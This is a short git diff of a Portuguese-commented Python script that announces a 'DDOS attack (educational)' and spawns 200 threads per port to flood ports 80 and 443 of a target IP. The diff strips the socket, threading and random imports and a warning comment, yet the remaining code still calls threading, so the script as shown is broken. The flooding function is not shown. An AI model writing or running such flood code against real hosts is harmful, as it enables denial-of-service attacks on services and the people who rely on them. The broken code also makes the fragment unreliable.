@@ -36,10 +36,6 @@ print("ATAQUE DDOS INICIADO(educacional)")
 time.sleep(3)
 
 
-import socket
-import threading
-import random
-
 # Configurações
 tentativas_por_thread = 1000 # Evita loop infinito travando o PC
 
@@ -71,8 +67,7 @@ threads = []
 
 print(f"--- INICIANDO CARGA MÁXIMA EM {ip} ---")
 
-# Aumentamos o número de threads. 
-# Cuidado: valores muito altos podem travar o SEU computador.
+
 for i in range(200):  
     t80 = threading.Thread(target=estresse_maximo, args=(ip, 80))
     t443 = threading.Thread(target=estresse_maximo, args=(ip, 443))
